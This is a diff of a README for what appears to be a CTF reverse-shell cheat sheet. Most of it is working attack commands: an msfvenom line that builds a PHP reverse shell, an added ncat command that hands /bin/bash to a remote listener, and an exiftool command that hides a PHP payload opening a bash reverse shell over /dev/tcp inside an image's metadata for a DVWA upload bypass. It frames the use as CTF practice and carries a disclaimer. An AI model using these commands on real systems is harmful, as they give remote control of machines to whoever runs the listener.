@@ -1,5 +1,4 @@
 # reverse-shell
-
 While working on various CTF challenges, I discovered the need for reverse shell scripts to gain remote access to compromised systems.
 With the goal of streamlining this process, I compiled a list of useful scripts that I have personally used in CTF competitions.
 
@@ -11,15 +10,15 @@ Any misuse of these scripts is strictly prohibited and may result in legal conse
 
 
 # Generate custom shell
-
 msfvenom -p php/reverse_php lport=4444 lhost=192.168.29.4 > ./php_reverse_shell.php
 
 
 # Find shell into local system
-
 locate reverse | grep php
 
+# ncat shell on Linux Server
+Server: ncat 192.168.29.1 4444 -e /bin/bash
+Client: nc -lnvp 4444
 
 # DVWA File Upload high
-
 exiftool -Comment="<?php \$command = '/bin/bash -c \"bash -i >& /dev/tcp/192.168.29.4/4444 0>&1\"'; \$output = shell_exec(\$command); echo \$output; ?>" dvwa_error.png
